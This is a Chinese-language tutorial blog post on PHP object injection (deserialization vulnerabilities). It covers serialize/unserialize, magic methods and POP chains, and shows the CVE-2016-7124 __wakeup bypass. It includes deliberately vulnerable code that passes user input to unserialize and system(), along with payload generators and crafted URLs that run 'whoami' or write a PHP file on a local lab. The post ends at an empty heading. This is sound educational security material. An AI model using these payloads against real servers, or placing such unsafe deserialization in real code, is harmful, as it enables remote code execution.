## php-object-injection

来源：[http://4hou.win/wordpress/?p=15931](http://4hou.win/wordpress/?p=15931)

时间 2018-02-23 14:44:27

 
## 0×00 序列化
 
所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 所有php里面的值都可以使用函数 [serialize()][2] 来返回一个包含字节流的字符串来表示。 [unserialize()][3] 函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。序列化的例子 

```php
<?php
/**
 * 
 * @authors daiker (<a href="/cdn-cgi/l/email-protection" data-cfemail="086c6961636d7a7b6d6b486f65696164266b6765">[email protected]</a>)
 * @date    2017-12-22 15:39:43
 * @version $Id$
 */
error_reporting(E_ALL);
$var_int = 1;
$var_str = "123";
$var_float = 1.2;
$var_bool =  true;
$var_arr = array('1' => 1,1.2,false );
class ClassName   {
    var $var_name = 1;
    function  myfunction(){
        return "1";
    }
}
   $arrayName = array($var_int,$var_str,$var_float,$var_bool,$var_arr,new ClassName ());

   foreach ($arrayName as $key => $value) {
    echo serialize($value)."<br/>";
   }
```
 
结果是

```php
i:1;
s:3:"123";
d:1.2;
b:1;
a:3:{i:1;i:1;i:2;d:1.2;i:3;b:0;}
O:9:"ClassName":1:{s:8:"var_name";i:1;}
```
 
从例子中我们可以看到，变量，数组，对象可以被序列化。变量的值会被保存下来。以`:` 隔开，类名会被保存下来，类变量，类变量名和类变量值会被保存下来，类方法不会被保存起来。 
 
## 0×01 反序列化
 
反序列化就是将序列化后的字符串转化回数组和对象看例子

```php
<?php
/**
 * 
 * @authors daiker (<a href="/cdn-cgi/l/email-protection" data-cfemail="503431393b352223353310373d31393c7e333f3d">[email protected]</a>)
 * @date    2017-12-22 16:02:17
 * @version $Id$
 */

$un_arr_str = 'a:3:{i:1;i:1;i:2;d:1.2;i:3;b:0;}';//$var_arr = array('1' => 1,1.2,false );
$un_class_str = 'O:9:"ClassName":1:{s:8:"var_name";i:1;}';
var_dump(unserialize($un_arr_str));
$O = unserialize($un_class_str);
// var_dump($O);
var_dump($O->var_name);
```
 
这里的结果是

```php
array(3) { [1]=> int(1) [2]=> float(1.2) [3]=> bool(false) } 
NULL
```
 
比较奇怪的是为什么第二个会是NULL。因为将对象序列化之后，只是保存它的关键数据，对于这个类的具体内容一无所知。所以反序列回一个对象的时候，需要反序列的上下文中存在模板(这里就是类的定义)。
 
## 0×02 魔术函数
 
PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。下面举一个例子。

```php
class ClassName  {

    function __construct(){
        echo "Hello,I am __construct";
    }
}

new ClassName();
```
 
这里的输出结果是

```
Hello,I am __construct
```
 
其实这里的一个对象实例化的过程中默认会调用的__construct()。php常用的魔术函数有

```
__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， __sleep()， __wakeup()， __toString()， __invoke()， __set_state()， __clone() 和 __debugInfo()
```
 
这里们并非每个都会在这里面用到，下面用一个例子来说下看几个常用到的魔术函数。

```php
<?php
/**
 * 
 * @authors daiker (<a href="/cdn-cgi/l/email-protection" data-cfemail="0561646c6e6077766066456268646c692b666a68">[email protected]</a>)
 * @date    2017-12-22 16:24:32
 * @version $Id$
 */

class ClassName  {
    private $name ="123";
    function __construct(){
        echo "Hello,I am __construct"."<br/>";
    }
    function __destruct(){
        echo "Hello,I am __destruct"."<br/>";
    }
    function __wakeup(){
        echo "Hello,I am __wakeup"."<br/>";
    }
    function __sleep(){
        echo "Hello,I am __sleep"."<br/>";
        return array($this->name);
    }
    function __get($name){
        echo "Hello,I am __get"."<br/>";
        return $this->name;
    }
    function __toString(){
        echo "Hello,I am __toString"."<br/>";
        return "Hello";
    }
}

$O = new ClassName();
$s= serialize($O);
echo $s."<br/>";
$O = unserialize($s);
$O."<br/>";
$O->nothing;
```
 
从例子我们可以看出，当初序列化一个对象是默认会调用`__sleep` ，反序列化是会调用`__wakeup` ，而`__construct` 会在实例化一个对象是被调用，`__desturct` 会在对象不再使用或者程序退出时自动调用,`__toString` 会在对象被当做字符串时使用(特别注意字符串连接符`.` )。`__get` 会在读取不可访问的属性的值的时候调用 
 
## 0×03 反序列化漏洞
 
先举一个反序列化漏洞例子

```php
<?php
/**
 * 
 * @authors daiker (<a href="/cdn-cgi/l/email-protection" data-cfemail="117570787a746362747251767c70787d3f727e7c">[email protected]</a>)
 * @date    2017-12-22 16:45:11
 * @version $Id$
 */

class ClassName {
    var $ip;
    function __wakeup(){
        system('ping -c 4'.$this->ip);
    }
}
$O = unserialize($_GET['daiker']);
```
 
我们分析这串代码，可以得出一下结论
 
 
* 反序列化的的字符串我们可控 
*  反序列化默认会调用`__wakeup()`  
* 变量ip是会保存在反序列化的字符串里面的，我们可控所以我们下面构造payload。 
 

```php
<?php
    *   @authors daiker (<a href="/cdn-cgi/l/email-protection" data-cfemail="d6b2b7bfbdb3a4a5b3b596b1bbb7bfbaf8b5b9bb">[email protected]</a>)
    *   @date 2017-12-22 16:45:11
    *   @version $Id$*/

class ClassName { var $ip = "|whoami";}

echo urlencode(serialize(new ClassName()));
```
 
然后`http://127.0.0.1/php-obj/example4.php?daiker=O%3A9%3A%22ClassName%22%3A1%3A%7Bs%3A2%3A%22ip%22%3Bs%3A7%3A%22%7Cwhoami%22%3B%7D` 就可以执行`whoami` ,所以这里就导致RCE所以总结来讲，PHP对象注入(又叫反序列化漏洞)，需要几点条件。 
 
 
* 反序列化字符串可控 
* 有魔术方法会调用对象属性 
 
 
对于反序列化的漏洞利用的效果取决于魔术方法里面对成员属性的调用方式，如上面的`system()` 就会导致RCE，也可能是注入，任意文件上传等问题。 
 
## 0×04 类变量的注意点
 
看下面一个例子

```php
<?php
/**
*   @authors daiker (<a href="/cdn-cgi/l/email-protection" data-cfemail="96f2f7fffdf3e4e5f3f5d6f1fbf7fffab8f5f9fb">[email protected]</a>)
*   @date 2017-12-22 19:08:38
*   @version $Id$*/class ClassName{

    private $a = 1; protected $b =2; 
    public $c =3;//
}echo serialize(new ClassName())."";echo urlencode(serialize(new ClassName()));
```
 
看输出结果
 
`O:9:"ClassName":3:{s:12:"ClassNamea";i:1;s:4:"*b";i:2;s:1:"c";i:3;}O%3A9%3A%22ClassName%22%3A3%3A%7Bs%3A12%3A%22%00ClassName%00a%22%3Bi%3A1%3Bs%3A4%3A%22%00%2A%00b%22%3Bi%3A2%3Bs%3A1%3A%22c%22%3Bi%3A3%3B%7D%` 一个个比较，我们会发现不可打印字符打印不出来。如果我们把可打印字符用作payload，会利用失败.如果是private 的变量，序列化的时候就会变成`\x00类名\x变量名` ，这里就是`\xClassName\x00a` ，urlencode之后变成`%00ClassName%00a` 。如果是protected的变量，序列化之后就会变成`\x00\x2A\x00变量名` 。 
 
## 0×05 POP Chain
 
前面说到，要找反序列化漏洞，要有两个点。第一个是反序列化的参数可控，第二个是有魔术方法调用对象属性。但是我们往往会遇到一个问题，就是我们反序列化的参数可控，但是，没有合适的魔术方法，或者是魔术方法对对象属性的调用方法无法利用。这时候就有人提出了一个新的思路叫做POP Chain(跟二进制里面的ROP Chain 思路很像)。POP chain利用的条件是找到的魔术方法不可以直接利用，但它有调用其它方法或者使用其它的变量时，可以在其它的类中寻找同名的方法或是变量，直到可以利用的点。下面看一个简单的例子。

```php
<?php
/**
 * 
 * @authors daiker (<a href="/cdn-cgi/l/email-protection" data-cfemail="e480858d8f8196978187a48389858d88ca878b89">[email protected]</a>)
 * @date    2017-12-22 19:41:17
 * @version $Id$
 */
class One{
    function myfunction(){
        echo "Hello,world";
    }
}
class Another{
    var $cmd ;
    function myfunction(){
        $this->attack();
    }
    function attack(){
        system($this->cmd);
    }
}
class ClassName  {
    var $class ;
    function __construct(){
        $this->class=new One();

    }
    function __wakeup(){
        $this->class->myfunction();
    }
}
$O = unserialize($_GET['daiker']);
```
 
我们分析下代码，可以发现一下几点
 
 
* 反序列化参数可控 
* 存在魔术方法__construct()，这里不可以直接利用 
* __construct()调用了myfunction(),myfunction()不可以利用 
*  其他类存在同名函数myfunction()，且另外一个类里面的Myfunction不可以单独被利用，但是存在可被利用的函数`system()` 构造payload  
 

```php
<?php
/**
* 
* @authors daiker (<a href="/cdn-cgi/l/email-protection" data-cfemail="f99d9890929c8b8a9c9ab99e94989095d79a9694">[email protected]</a>)
* @date    2017-12-22 20:26:02
* @version $Id$
*/
class Another{
 var $cmd;
 function __construct(){
     $this->cmd = "whoami";
 }//跟直接写 var $cmd = "whoami'，不写__construct一样，这里演示还有这种写法
}
class ClassName  {
 var $class ;
 function __construct(){
     $this->class=new Another();
 }
}
echo serialize(new ClassName());
```
 
然后提交`http://127.0.0.1/php-obj/pop.php?daiker=O:9:%22ClassName%22:1:){s:5:%22class%22;O:7:%22Another%22:1:{s:3:%22cmd%22;s:6:%22whoami%22;}}` 
 
## 0×06 CVE-2016-7124
 
我们看一个代码
 
<?php class object{

```php
public $var = "hello,world";

 function get_flag(){  
     return 'aaaa';  
 }
 function __wakeup(){
     $this->var = "hello,wold";
 }
 function __destruct(){
     $fp=fopen("F:\\phpStudy\\WWW\\unse\\hello.php","w");
     fputs($fp,$this->var);
     fclose($fp);
 }
}
$content = $_POST['content'];$object = unserialize($content);?>
```
 
对比上面的代码，可以发现多了
 
`function __wakeup(){ $this->var = "hello,wold"; }` 
 
这个魔术函数的作用就是在反序列化的时候会执行函数里面的东西，在这题，，我们就算更改了`var` 这个变量的值，wakeup还是会把他改回来。这时候就要用到一个CVE。谷歌发现了CVE-2016-7124。简单来说就是当序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过**wakeup的执行。参考 [https://bugs.php.net/bug.php?id=72663][4] ，某一种情况下，出错的对象不会被毁掉，会绕过__wakeup函数、引用其他的魔术方法。我们只要保证成员属性数目大于实际数目时可绕过wakeup方法，原来的序列化字符串是`O:6:"object":1:{s:3:"var";s:18:"<?php phpinfo() ?>";}` 把object后面的1更改为大于1的数字就可以了。。 
 

![][0] 
 

![][1] 
 
成功绕过
 
## 0×07 经典案例
 


[2]: http://php.net/manual/zh/function.serialize.php
[3]: http://php.net/manual/zh/function.unserialize.php
[4]: https://bugs.php.net/bug.php?id=72663
[0]: https://img1.tuicool.com/ZfqMf2b.png
[1]: https://img0.tuicool.com/BfQz2iz.png